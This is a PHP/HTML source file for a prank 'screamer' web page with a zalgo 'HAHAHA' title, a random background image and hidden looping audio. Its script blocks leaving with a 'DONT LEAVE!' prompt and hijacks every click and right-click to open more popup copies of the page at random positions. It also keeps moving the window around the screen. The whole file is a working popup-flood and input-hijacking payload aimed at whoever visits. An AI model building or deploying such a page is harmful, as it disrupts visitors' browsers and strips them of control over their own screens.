<?php
$images = ["/./images/s9d6er.png", "/./images/egvrf0.jpg"];
$randomImg = $images[array_rand($images)];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.5, shrink-to-fit=yes">

    
    <title>H̵̬͇̝̯̙̹̹̞͙̺͌̌̒̿́̈́̋̋́̈́A̷̲̤̎̐́̀H̸̫͔̩̼̯͎̼̜͊͋̔̐̀Ą̵̛̑̀͗H̵͖̦̗̺̘̻̳͈̠́́͗̔A̸͕̎̏́̆̏͂̐̚͝H̶̡̝̮͇͔͕͉̫̙̺̭̓̉̑̈́̚A̴̜͙̮̯̫̲͎̅H̸̡̠̲̜͓̪̜̹̿̀͋̓͝A̶̯̘̘̱̒́̏͌̋́͘͝H̷̢̱̭̘̙̬̥̍̾̈́̈̓̽̈́̋̏A̷̡̮͙͉̠̺̖͑H̶̢̱̟̗̙͑͂͒Ä̷̢͕̬͎̞̠́̑̎͒͐͊̌̚͠ͅ!̸̨̳̬͍̠̺̺͔͍̑!̶͎̻̦̳̥͔͍̫͕͖͂̇̇̋̔̃̒̚͜!̶͙̬̩̳̥̰̬̣̰̉͑͆͜</title>


<body style="background-image: url('<?php echo $randomImg; ?>'); background-repeat: no-repeat; background-attachment: fixed; background-size: 100% 100%;" onload="playBall();">

<script>
window.onbeforeunload = function() {
    return "DONT LEAVE!";
};

var clickCount = 0;

document.addEventListener('click', function(event) {
    event.preventDefault();
    haha();
});

document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
    haha();
});

function haha() {
    var w = window.open(location.href, "_blank", "width=400,height=300");
    w.resizeTo(400*1.5, 299*1.5);
    w.moveTo(Math.floor((Math.random()*window.screen.availWidth)+1), Math.floor((Math.random()*window.screen.availHeight)+1));
}

    var xPos = 0;
    var yPos = 0;
    var xOff = 5;
    var yOff = 5;
    var flagrun = 1;

    function newXlt() {
        xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
        window.focus();
    }

    function newXrt() {
        xOff = Math.ceil(7 * Math.random()) * 5 - 10;
    }

    function newYup() {
        yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
    }

    function newYdn() {
        yOff = Math.ceil(7 * Math.random()) * 5 - 10;
    }

    function fOff() {
        flagrun = 0;
    }

    function playBall() {
        xPos += xOff;
        yPos += yOff;
        if (xPos > screen.width - 299) {
            newXlt();
        }
        if (xPos < 0) {
            newXrt();
        }
        if (yPos > screen.height - 400) {
            newYup();
        }
        if (yPos < 0) {
            newYdn();
        }
        if (flagrun == 1) {
            window.moveTo(xPos, yPos);
            setTimeout(playBall, 1);
        }
    }
</script>

<audio controls autoplay hidden loop src="/sounds/boo1.mp3"></audio>
</body>
</html>
